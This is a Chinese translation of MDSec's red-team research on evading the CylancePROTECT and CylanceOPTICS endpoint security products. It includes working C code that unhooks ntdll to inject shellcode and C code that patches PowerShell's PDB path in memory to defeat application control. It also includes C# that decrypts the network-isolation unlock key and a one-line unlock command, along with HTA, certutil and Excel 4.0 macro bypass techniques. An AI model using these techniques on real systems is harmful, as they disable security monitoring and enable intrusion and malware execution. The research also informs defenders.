> 原文链接: https://www.anquanke.com//post/id/173326 


# EDR规避研究：如何绕过Cylance


                                阅读量   
                                **294964**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者mdsec.co.uk，文章来源：mdsec.co.uk
                                <br>原文地址：[https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/](https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01279b57fc51bebf13.png)](https://p3.ssl.qhimg.com/t01279b57fc51bebf13.png)



## 一、前言

红队成员经常需要跟许多大型组织打交道，因此我们经常面对各种各样的EDR（端点检测和响应）解决方案。为了提高在这些环境中的成功率，我们会定期分析这些产品，确定防护特征、绕过方法以及其他策略，确保行动能畅通无阻。在这些解决方案中，我们经常面对的是CylancePROTECT，这是Cylance Inc推出的一款产品（Cylance最近被Blackberry以14亿美元[收购](https://www.itworldcanada.com/article/blackberry-completes-acquisition-of-cylance/415246)）。

在本文中，我们将与大家分享可能帮助红队绕过CylancePROTECT的一些方法，并且简要介绍一下CylanceOPTICS（能够提供基于规则检测的一种补充方案）。我们的目标是帮助防御方理解该解决方案的工作原理，更好理解其中的不足，以便引入补充方案，解决潜在风险。



## 二、Cylance概述

CylancePROTECT（以下简称为Cylance）是基于设备策略的一种EDR解决方案，可以通过Cylance SaaS口进行配置，具体策略包括如下安全相关选项：
- 内存操作：控制启用哪些内存保护机制，包括漏洞利用、进程注入以及越界技术。
- 应用控制：阻止新应用运行。
- 脚本控制：配置该选项以便阻止Active Script（VBS及JS）、PowerShell以及Office宏。
- 设备控制：配置对可移动设备的访问权限。
在本文中，我们将探索这些控制机制的有效性，也会分享如何绕过或禁用这些机制的方法。我们研究的对象为CylancePROTECT 2.0.1500版，这也是本文撰写时（2018年12月）的最新版本。



## 三、脚本控制

CylancePROTECT的脚本控制功能可以帮助管理员配置是否阻止或允许Windows脚本、PowerShell以及Office宏，也可以配置是否在端点上弹出警告信息。典型的配置如下所示，可以阻止所有脚本、PowerShell以及宏文件：

[![](https://p3.ssl.qhimg.com/t01bc5d10d82b12f24e.png)](https://p3.ssl.qhimg.com/t01bc5d10d82b12f24e.png)

在这种配置下，该解决方案会禁用包含VBA宏的简单文档，甚至如下相对无害的宏也无法幸免：

[![](https://p2.ssl.qhimg.com/t010f8353d3cff1661c.png)](https://p2.ssl.qhimg.com/t010f8353d3cff1661c.png)

同时Cylance仪表盘中将生成相应事件，如下所示：

[![](https://p0.ssl.qhimg.com/t0134e6c2a0365141c8.png)](https://p0.ssl.qhimg.com/t0134e6c2a0365141c8.png)

虽然这种机制对普通的VBA宏来说非常有效，但我们发现Excel 4.0宏并没有在限制名单中，具备完全访问权限（参考[该视频](https://vimeo.com/322902013)）。

CylancePROTECT并没有限制启用Excel 4.0宏的文档，甚至当策略明确要阻止宏文档时也不起作用。因此，我们可以通过这种方法在Cylance环境中获得初始访问权限。大家可以参考[Stan Hegt](https://twitter.com/StanHacked)发表的[研究成果](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)了解启用Excel 4.0宏文档的相关内容。

需要注意的是，其他控制策略（如阻止漏洞利用、注入及越界等内存防护策略）仍处于生效状态，稍后我们将讨论这方面内容。

除了宏之外，CylancePROTECT也能阻止Windows Script Host文件运行（特别是VBScript及JavaScript文件）。因此，当我们尝试在`.js`或者`.vbs`文件中使用`WScript.Shell`运行脚本时，由于启动了ActiveScript防护，Cylance会阻止这种行为，如下所示：

[![](https://p1.ssl.qhimg.com/t0170b62d2181cca949.png)](https://p1.ssl.qhimg.com/t0170b62d2181cca949.png)

Cylance面板中将看到如下错误信息：

[![](https://p3.ssl.qhimg.com/t01bb6bc374d80e0f8d.png)](https://p3.ssl.qhimg.com/t01bb6bc374d80e0f8d.png)

然而，如果我们使用同一段JavaScript代码，将其嵌入某个HTML应用中，如下所示：

[![](https://p5.ssl.qhimg.com/t01381749b464a7f028.png)](https://p5.ssl.qhimg.com/t01381749b464a7f028.png)

可以看到，如果脚本没有直接使用`wscript.exe`来运行，那么CylancePROTECT就不会应用同样的控制策略。如[该视频](https://vimeo.com/322903302)所示，通过`mshta.exe`运行的HTA并不会遇到任何阻拦。

能弹出计算器当然不错，接下来我们看看使用SharpShooter配合HTA时能达到什么效果。

[![](https://p1.ssl.qhimg.com/t0171b25c479e68fa28.png)](https://p1.ssl.qhimg.com/t0171b25c479e68fa28.png)

SharpShooter可以生成一个DotNetToJScript payload，在内存中执行原始shellcode（使用`VirtualAlloc`在内存中分配空间，获得指向该shellcode的函数指针，然后再[执行](https://github.com/mdsecactivebreach/SharpShooter/blob/master/templates/shellcode.cs)，这是在.NET中执行shellcode的标准方法）。当执行HTA时，Cylance会阻止payload并生成一个错误，查看面板后我们并不能得到太多信息，但基本上可以肯定这是内存防护控制策略所造成的结果：

[![](https://p5.ssl.qhimg.com/t0195f89a18b5d80f69.png)](https://p5.ssl.qhimg.com/t0195f89a18b5d80f69.png)

这里先不要管shellcode执行的问题（回头我们会解决这个问题），我们发现Cylance对执行`calc.exe`的方式并不是特别感冒（不管是通过宏或者HTA payload）。再来看看如果尝试下载或运行Cobalt Strike beacon会出现什么情况。这里我们使用如下HTA，通过WScript调用`certutil`来下载和执行Cobalt Strike可执行文件：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01dcb1b0d9c823a593.png)

执行过程参考[此处视频](https://vimeo.com/322903912)。

从视频中可知，如果目标环境中部署了CylancePROTECT，那么我们可能非常需要将常用的应用程序列入白名单中。



## 四、内存防护

现在来看一下内存保护机制。当分析端点安全产品的内存保护机制时，我们非常有必要澄清该产品如何检测常见的可疑API调用（如`CreateRemoteThread`或`WriteProcessMemory`）。

我们可以通过控制台选项了解Cylance支持的内存分析策略：

[![](https://p1.ssl.qhimg.com/t014d9baf57f6492440.png)](https://p1.ssl.qhimg.com/t014d9baf57f6492440.png)

如果启用了这些防护策略，我们发现Cylance会将`CyMemdef.dll`注入32位进程，将`CyMemDef64.dll`注入64位进程。

为了理解Cylance部署的防护措施，我们可以利用`CreateRemoteThread`来模拟恶意软件常用的内存注入技术。简单的PoC代码如下所示：

```
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, procID);
if (hProc == INVALID_HANDLE_VALUE) `{`
    printf("Error opening process ID %dn", procID);
    return 1;
`}`
void *alloc = VirtualAllocEx(hProc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (alloc == NULL) `{`
    printf("Error allocating memory in remote processn");
    return 1;
`}`
if (WriteProcessMemory(hProc, alloc, shellcode, sizeof(shellcode), NULL) == 0) `{`
    printf("Error writing to remote process memoryn");
    return 1;
`}`
HANDLE tRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
if (tRemote == INVALID_HANDLE_VALUE) `{`
    printf("Error starting remote threadn");
    return 1;
`}`
```

与我们设想的一致，执行这段代码会被Cylance检测到，进程也会被终止：

[![](https://p3.ssl.qhimg.com/t01036d994c3710a4a3.png)](https://p3.ssl.qhimg.com/t01036d994c3710a4a3.png)

检查Cylance注入的DLL，可以发现Cylance在进程中植入了多个hook，以检测进程是否调用这些可疑函数。比如，如果我们在`NtCreateThreadEx`（为`CreateRemoteThread`提供syscall）上设置一个断点，然后调用该API，我们可以看到Cylance会通过`JMP`指令修改该函数：

[![](https://p0.ssl.qhimg.com/t019a1c8230470b077e.png)](https://p0.ssl.qhimg.com/t019a1c8230470b077e.png)

通过`JMP`继续执行，就会触发Cylance警告，强制结束我们的程序。了解这一点后，我们可以从进程中修改被hook的指令，移除Cylance检测机制：

```
#include &lt;iostream&gt;
#include &lt;windows.h&gt;
unsigned char buf[] =
"SHELLCODE_GOES_HERE";
struct syscall_table `{`
    int osVersion;
`}`;
// Remove Cylance hook from DLL export
void removeCylanceHook(const char *dll, const char *apiName, char code) `{`
    DWORD old, newOld;
    void *procAddress = GetProcAddress(LoadLibraryA(dll), apiName);
    printf("[*] Updating memory protection of %s!%sn", dll, apiName);
    VirtualProtect(procAddress, 10, PAGE_EXECUTE_READWRITE, &amp;old);
    printf("[*] Unhooking Cylancen");
    memcpy(procAddress, "x4cx8bxd1xb8", 4);
    *((char *)procAddress + 4) = code;
    VirtualProtect(procAddress, 10, old, &amp;newOld);
`}`

int main(int argc, char **argv)
`{`
    if (argc != 2) `{`
        printf("Usage: %s PIDn", argv[0]);
        return 2;
    `}`
    DWORD processID = atoi(argv[1]);
    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, false, processID);
    if (proc == INVALID_HANDLE_VALUE) `{`
        printf("[!] Error: Could not open target process: %dn", processID);
        return 1;
    `}`
    printf("[*] Opened target process %dn", processID);
    printf("[*] Allocating memory in target process with VirtualAllocExn");
    void *alloc = VirtualAllocEx(proc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (alloc == (void*)0) `{`
        printf("[!] Error: Could not allocate memory in target processn");
        return 1;
    `}`
    printf("[*] Allocated %d bytes at memory address %pn", sizeof(buf), alloc);
    printf("[*] Attempting to write into victim process using WriteProcessMemoryn");
    if (WriteProcessMemory(proc, alloc, buf, sizeof(buf), NULL) == 0) `{`
        printf("[!] Error: Could not write to target process memoryn");
        return 1;
    `}`
    printf("[*] WriteProcessMemory successfuln");

    // Remove the NTDLL.DLL hook added by userland DLL
    removeCylanceHook("ntdll.dll", "ZwCreateThreadEx", 0xBB);
    printf("[*] Attempting to spawn shellcode using CreateRemoteThreadn");
    HANDLE createRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
    printf("[*] Success :Dn");
`}`
```

执行PoC后，可以看到我们的shellcode能正常执行，不会触发任何警告：

[![](https://p0.ssl.qhimg.com/t01a186dc47a7811327.png)](https://p0.ssl.qhimg.com/t01a186dc47a7811327.png)

这种自我监管型的防护策略始终存在一些问题，因为这种机制需要依赖进程来检测自己是否存在可疑行为。

我们在2018年11月份开展这项研究，但之前[@fsx30](https://github.com/fsx30)/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6″&gt;研究内容，其中演示了如何利用该技术转储进程内存。



## 五、应用控制

Cylance还提供另一项保护功能，可以阻止用户执行某些应用程序（如PowerShell）。启用该保护功能后，如果我们尝试执行PowerShell时，就会出现如下警告：

[![](https://p3.ssl.qhimg.com/t013a2b2732963f3d17.png)](https://p3.ssl.qhimg.com/t013a2b2732963f3d17.png)

从前文分析可知，Cylance会将DLL注入进程中，以分析并部署防护措施。了解这一点后，我们可以分析`CyMemDef64.dll`，确定这里是否存在相同限制。

我们首先发现Cylance会调用`NtQueryInformationProcess`来检测应用程序可执行文件的名称：

[![](https://p4.ssl.qhimg.com/t01027e82dbdd637551.png)](https://p4.ssl.qhimg.com/t01027e82dbdd637551.png)

提取该信息后，将其与`PowerShell.exe`字符串进行对比：

[![](https://p4.ssl.qhimg.com/t01974a1d8ef42188a9.png)](https://p4.ssl.qhimg.com/t01974a1d8ef42188a9.png)

如果我们将`PowerShell.exe`可执行文件名改为`PS.exe`，是否能绕过这种限制？好吧可能没那么简单（但相信我们，在没引入其他缓解措施之前，这种方法可以绕过Cylance的PowerShell保护机制，万能的`Powercatz.exe`）。这表明Cylance还有其他校验措施，我们在同一个函数中找到了如下信息：

[![](https://p4.ssl.qhimg.com/t01d5f09a416a16b9c6.png)](https://p4.ssl.qhimg.com/t01d5f09a416a16b9c6.png)

这里可以看到`powershell.pdb`字符串会被传递给某个函数，用来判断PE调试目录中是否存在该字符串。如果满足条件，则Cylance会将另一个DLL（`CyMemDefPS64.dll`）载入PowerShell进程中，这是一个.NET assembly，负责显示我们前面看到的警告信息。

那么如果我们修改PowerShell可执行文件的PEB信息，会出现什么情况？

[![](https://p3.ssl.qhimg.com/t017b8008b954854eda.png)](https://p3.ssl.qhimg.com/t017b8008b954854eda.png)

[![](https://p1.ssl.qhimg.com/t01d8ee3e63d7737e7b.png)](https://p1.ssl.qhimg.com/t01d8ee3e63d7737e7b.png)

非常棒，现在我们知道Cylance阻止PowerShell执行的具体原理，但以这种方式修改程序并不是理想的解决方案，因为这样会改变文件的哈希值，也会破坏文件签名。我们如何在不修改PowerShell可执行文件的基础上达到同样效果？一种可选方法就是生成PowerShell进程，并尝试在内存中修改PDB引用。

为了生成PowerShell进程，我们可以使用`CreateProcess`，传入`CREATE_SUSPENDED`标志。一旦创建处于挂起状态的线程，我们需要定位PEB结构，找到PowerShell PE在内存中的基址。接下来只要在恢复运行前解析PE文件结构并修改PDB引用即可，相关代码如下所示：

```
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
#include &lt;winternl.h&gt;

typedef NTSTATUS (*NtQueryInformationProcess2)(
    IN HANDLE,
    IN PROCESSINFOCLASS,
    OUT PVOID,
    IN ULONG,
    OUT PULONG
);

struct PdbInfo
`{`
    DWORD     Signature;
    BYTE      Guid[16];
    DWORD     Age;
    char      PdbFileName[1];
`}`;

void* readProcessMemory(HANDLE process, void *address, DWORD bytes) `{`
    char *alloc = (char *)malloc(bytes);
    SIZE_T bytesRead;
    ReadProcessMemory(process, address, alloc, bytes, &amp;bytesRead);
    return alloc;
`}`

void writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) `{`
    SIZE_T bytesWritten;
    WriteProcessMemory(process, address, data, bytes, &amp;bytesWritten);
`}`

void updatePdb(HANDLE process, char *base_pointer) `{`
    // This is where the MZ...blah header lives (the DOS header)
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)readProcessMemory(process, base_pointer, sizeof(IMAGE_DOS_HEADER));
    // We want the PE header.
    IMAGE_FILE_HEADER* file_header = (IMAGE_FILE_HEADER*)readProcessMemory(process, (base_pointer + dos_header-&gt;e_lfanew + 4), sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER));

    // Straight after that is the optional header (which technically is optional, but in practice always there.)
    IMAGE_OPTIONAL_HEADER *opt_header = (IMAGE_OPTIONAL_HEADER *)((char *)file_header + sizeof(IMAGE_FILE_HEADER));
    // Grab the debug data directory which has an indirection to its data
    IMAGE_DATA_DIRECTORY* dir = &amp;opt_header-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
    // Convert that data to the right type.
    IMAGE_DEBUG_DIRECTORY* dbg_dir = (IMAGE_DEBUG_DIRECTORY*)readProcessMemory(process, (base_pointer + dir-&gt;VirtualAddress), dir-&gt;Size);
    // Check to see that the data has the right type
    if (IMAGE_DEBUG_TYPE_CODEVIEW == dbg_dir-&gt;Type)
    `{`
        PdbInfo* pdb_info = (PdbInfo*)readProcessMemory(process, (base_pointer + dbg_dir-&gt;AddressOfRawData), sizeof(PdbInfo) + 20);
        if (0 == memcmp(&amp;pdb_info-&gt;Signature, "RSDS", 4))
        `{`
            printf("[*] PDB Path Found To Be: %sn", pdb_info-&gt;PdbFileName);
            // Update this value to bypass the check
            DWORD oldProt;
            VirtualProtectEx(process, base_pointer + dbg_dir-&gt;AddressOfRawData, 1000, PAGE_EXECUTE_READWRITE, &amp;oldProt);
            writeProcessMemory(process, base_pointer + dbg_dir-&gt;AddressOfRawData + sizeof(PdbInfo), (void*)"xpn", 3);
        `}`
    `}`
    // Verify that the PDB path has now been updated
    PdbInfo* pdb2_info = (PdbInfo*)readProcessMemory(process, (base_pointer + dbg_dir-&gt;AddressOfRawData), sizeof(PdbInfo) + 20);
    printf("[*] PDB path is now: %sn", pdb2_info-&gt;PdbFileName);
`}`

int main()
`{`
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    NtQueryInformationProcess2 ntpi;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD retLen;
    SIZE_T bytesRead;
    PEB pebLocal;
    memset(&amp;si, 0, sizeof(si));
    memset(&amp;pi, 0, sizeof(pi));
    printf("Bypass Powershell restriction POCnn");
    // Copy the exe to another location
    printf("[*] Copying Powershell.exe over to Tasks to avoid first checkn");
    CopyFileA("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "C:\Windows\Tasks\ps.exe", false);
    // Start process but suspended
    printf("[*] Spawning Powershell process in suspended staten");
    CreateProcessA(NULL, (LPSTR)"C:\Windows\Tasks\ps.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, "C:\Windows\System32\", &amp;si, &amp;pi);
    // Get thread address
    context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(pi.hThread, &amp;context);
    // Resolve GS to linier address
    printf("[*] Querying process for PEB addressn");
    ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
    ntpi(pi.hProcess, ProcessBasicInformation, &amp;pbi, sizeof(pbi), &amp;retLen);
    ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &amp;pebLocal, sizeof(PEB), &amp;bytesRead);
    printf("[*] Base address of Powershell.exe found to be %pn", pebLocal.Reserved3[1]);

    // Update the PDB path in memory to avoid triggering Cylance check
    printf("[*] Updating PEB in memoryn");
    updatePdb(pi.hProcess, (char*)pebLocal.Reserved3[1]);
    // Finally, resume execution and spawn Powershell
    printf("[*] Finally, resuming thread... here comes Powershell :Dn");
    ResumeThread(pi.hThread);
`}`

```

代码运行效果参考[此处视频](https://youtu.be/fkkm5fcJ5Ew)。



## 六、绕过Office宏

前面讨论过，Cylance中实现了基于Office的VBA宏防护机制（除了缺少Excel 4.0支持之外）。如果我们仔细检查这种防护，可以看到Cylance采用了前文类似的一些hook，在VBA运行时中添加了一些检查操作。在这种情况下，Cylance会将hook添加到`VBE7.dll`中，后者负责提供`Shell`或`CreateObject`之类的函数。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0173db3e0e06bd39f0.png)

然而我们发现，如果`CreateObject`成功调用，那么Cylance就不会继续检查COM对象。这意味着如果我们找到方法成功初始化目标COM对象，那么就可以绕过Cylance的保护机制。

一种方法就是简单添加VBA项目的引用即可。比如，我们可以添加关于“Windows Script Host Object Mode”的引用：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014d54fe1830e46340.png)

这样就可以在我们的VBA中访问`WshShell`对象，绕过被hook的`CreateObject`调用。一旦完成该操作后，我们就可以使用常见的Office宏技巧：

[![](https://p1.ssl.qhimg.com/t010731eec8c3ff0bb1.png)](https://p1.ssl.qhimg.com/t010731eec8c3ff0bb1.png)



## 七、绕过CylanceOptics隔离

虽然我们并没有特别关注CylanceOptics，但还是应该了解一下它所提供的有趣功能。

当安全人员检测到网络中存在可疑活动时，许多EDR解决方案可以将某台主机域其他网络隔离。在这种场景下，如果攻击者使用该主机作为入侵网络的立足点，那么这种方法可以有效消除攻击者对网络的影响。

CylanceOptics也支持这种隔离功能，通过web接口提供一个Lockdown选项：

[![](https://p4.ssl.qhimg.com/t018685b20ab2ce0228.png)](https://p4.ssl.qhimg.com/t018685b20ab2ce0228.png)

隔离某台主机后，我们发现CylanceOptics提供了一个解锁密钥：

[![](https://p0.ssl.qhimg.com/t0187b01cc4d6dcf530.png)](https://p0.ssl.qhimg.com/t0187b01cc4d6dcf530.png)

如果能重新连接之前被隔离的主机，那么对我们的渗透过程显然非常有价值。因此我们需要了解在攻击者已入侵某台主机，并且没有获得这种解锁密钥的情况下，如何解除网络隔离。

检查CylanceOptics assembly后，我们发现其中存在一个经过混淆的调用，该调用可以用来获取注册表键值：

[![](https://p2.ssl.qhimg.com/t0131ee983cedb21fda.png)](https://p2.ssl.qhimg.com/t0131ee983cedb21fda.png)

我们发现该调用会提取注册表中`HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics\PdbP`的值，随后该值会传递给.NET DPAPI `ProtectData.Unprotect` API：

[![](https://p5.ssl.qhimg.com/t01bb3358f20df346a0.png)](https://p5.ssl.qhimg.com/t01bb3358f20df346a0.png)

使用`LOCAL SYSTEM`对应的`DPAPI`主密钥来解密这个注册表键值后，我们可以提取出正确密码，相关代码如下所示：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
namespace CyOpticseUnlock
`{`
    class Program
    `{`
        static void Main(string[] args)
        `{`
            var fixed = new byte[] `{`
            0x78, 0x6A, 0x34, 0x37, 0x38, 0x53, 0x52, 0x4C, 0x43, 0x33, 0x2A, 0x46, 0x70, 0x66, 0x6B, 0x44,
            0x24, 0x3D, 0x50, 0x76, 0x54, 0x65, 0x45, 0x38, 0x40, 0x78, 0x48, 0x55, 0x54, 0x75, 0x42, 0x3F,
            0x7A, 0x38, 0x2B, 0x75, 0x21, 0x6E, 0x46, 0x44, 0x24, 0x6A, 0x59, 0x65, 0x4C, 0x62, 0x32, 0x40,
            0x4C, 0x67, 0x54, 0x48, 0x6B, 0x51, 0x50, 0x35, 0x2D, 0x46, 0x6E, 0x4C, 0x44, 0x36, 0x61, 0x4D,
            0x55, 0x4A, 0x74, 0x33, 0x7E
            `}`;
            Console.WriteLine("CyOptics - Grab Unlock Keyn");
            Console.WriteLine("[*] Grabbing unlock key from HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics\PdbP");
            byte[] PdbP = (byte[])Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics", "PdbP", new byte[] `{` `}`);
            Console.WriteLine("[*] Passing to DPAPI to unprotect");
            var data = System.Security.Cryptography.ProtectedData.Unprotect(PdbP, fixed, System.Security.Cryptography.DataProtectionScope.CurrentUser);
            System.Console.WriteLine("[*] Success!! Key is: `{`0`}`", ASCIIEncoding.ASCII.GetString(data));
        `}`
    `}`
`}`
```

现在我们只需要将该密码传递给CyOptics就能恢复网络连接（参考[此处视频](https://youtu.be/umQHOa1A0sc)）。

进一步研究后我们发现，虽然我们能提取相关密钥，但如果我们以`LOCAL SYSTEM`身份运行CyOptics命令，那么就不需要提供该密钥，只需要一条简单的命令就能解锁网络（参考[此处视频](https://youtu.be/yEftLqprpyU)）：

```
CyOptics.exe control unlock -net
```
